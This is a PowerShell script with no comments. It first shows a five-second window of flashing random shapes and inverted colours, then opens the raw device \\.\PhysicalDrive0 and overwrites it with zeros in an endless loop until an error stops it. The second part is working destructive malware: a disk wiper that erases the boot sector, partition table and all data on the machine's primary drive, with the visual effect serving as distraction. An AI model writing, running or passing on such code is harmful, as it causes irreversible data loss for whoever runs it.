Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$form = New-Object System.Windows.Forms.Form
$form.Text = "AAAAAAAAAAAAAAAAAA"
$form.Width = 900
$form.Height = 700
$form.BackColor = 'Black'
$form.DoubleBuffered = $true
$rand = New-Object System.Random
$bitmap = New-Object System.Drawing.Bitmap($form.ClientSize.Width, $form.ClientSize.Height)
$g = [System.Drawing.Graphics]::FromImage($bitmap)
$g.Clear([System.Drawing.Color]::Black)
$timer = New-Object System.Windows.Forms.Timer
$timer.Interval = 16
$stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
function Get-RandomColor {
    param($r)
    [System.Drawing.Color]::FromArgb($r.Next(0,256),$r.Next(0,256),$r.Next(0,256))
}
$timer.Add_Tick({
    if ($stopwatch.ElapsedMilliseconds -ge 5000) {
        $timer.Stop()
        $stopwatch.Stop()
        $form.Close()
        return
    }
    for ($i=0; $i -lt 20; $i++) {
        $x=$rand.Next(0,$bitmap.Width)
        $y=$rand.Next(0,$bitmap.Height)
        $w=$rand.Next(5,150)
        $h=$rand.Next(5,150)
        $brush=New-Object System.Drawing.SolidBrush (Get-RandomColor $rand)
        $g.FillRectangle($brush,$x,$y,$w,$h)
        $brush.Dispose()
    }
    for ($i=0; $i -lt 15; $i++) {
        $pen=New-Object System.Drawing.Pen (Get-RandomColor $rand),($rand.Next(1,8))
        $g.DrawLine($pen,$rand.Next(0,$bitmap.Width),$rand.Next(0,$bitmap.Height),$rand.Next(0,$bitmap.Width),$rand.Next(0,$bitmap.Height))
        $pen.Dispose()
    }
    for ($i=0; $i -lt 6; $i++) {
        $w=$rand.Next(40,250)
        $h=$rand.Next(40,250)
        $srcX=$rand.Next(0,$bitmap.Width-$w)
        $srcY=$rand.Next(0,$bitmap.Height-$h)
        $dstX=$rand.Next(0,$bitmap.Width-$w)
        $dstY=$rand.Next(0,$bitmap.Height-$h)
        $srcRect=New-Object System.Drawing.Rectangle($srcX,$srcY,$w,$h)
        $dstRect=New-Object System.Drawing.Rectangle($dstX,$dstY,$w,$h)
        $g.DrawImage($bitmap,$dstRect,$srcRect,[System.Drawing.GraphicsUnit]::Pixel)
    }
    if ($rand.NextDouble() -lt 0.05) {
        for ($x=0; $x -lt $bitmap.Width; $x++) {
            for ($y=0; $y -lt $bitmap.Height; $y++) {
                $px=$bitmap.GetPixel($x,$y)
                $inv=[System.Drawing.Color]::FromArgb(255-$px.R,255-$px.G,255-$px.B)
                $bitmap.SetPixel($x,$y,$inv)
            }
        }
    }
    $form.Invalidate()
})
$form.Add_Paint({ param($s,$e) $e.Graphics.DrawImage($bitmap,0,0) })
$form.Add_Resize({
    if ($form.ClientSize.Width -gt 0 -and $form.ClientSize.Height -gt 0) {
        $g.Dispose()
        $bitmap.Dispose()
        $bitmap = New-Object System.Drawing.Bitmap($form.ClientSize.Width,$form.ClientSize.Height)
        $g = [System.Drawing.Graphics]::FromImage($bitmap)
        $g.Clear([System.Drawing.Color]::Black)
    }
})
$timer.Start()
[System.Windows.Forms.Application]::Run($form)
$timer.Stop()
$g.Dispose()
$bitmap.Dispose()
$disk = "\\.\PhysicalDrive0"
$chunkSize = 4MB
$chunk = New-Object byte[]($chunkSize)
$totalWritten = 0

try {
    $stream = [System.IO.File]::Open($disk, [System.IO.FileMode]::Open, [System.IO.FileAccess]::ReadWrite)
    while ($true) {
        $stream.Write($chunk, 0, $chunkSize)
        $totalWritten += $chunkSize
        Write-Host "Written: $([math]::Round($totalWritten/1GB, 2)) GB"
    }
} catch {
    Write-Host "Stopped at $([math]::Round($totalWritten/1GB, 2)) GB — $_"
} finally {
    if ($stream) { $stream.Close() }
}
